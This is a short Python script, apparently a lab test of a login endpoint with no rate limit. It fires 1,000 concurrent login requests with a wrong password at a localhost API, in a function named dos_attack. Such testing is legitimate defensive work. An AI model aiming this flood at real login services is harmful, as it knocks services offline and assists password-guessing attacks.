import requests
from concurrent.futures import ThreadPoolExecutor

url = 'http://localhost:3001/api/login-no-limit'
username = 'testuser'
password = 'wrongpassword'

requests_count = 1000
concurrency = 50

def send_request():
    try:
        requests.post(url, json={'username': username, 'password': password}, timeout=5)
    except:
        pass  # ignore errors/timeouts

def dos_attack():
    with ThreadPoolExecutor(max_workers=concurrency) as executor:
        futures = [executor.submit(send_request) for _ in range(requests_count)]
        for _ in futures:
            pass  # just wait for all to finish
    print(f'Sent {requests_count} requests to the login-no-limit endpoint.')

if __name__ == '__main__':
    dos_attack()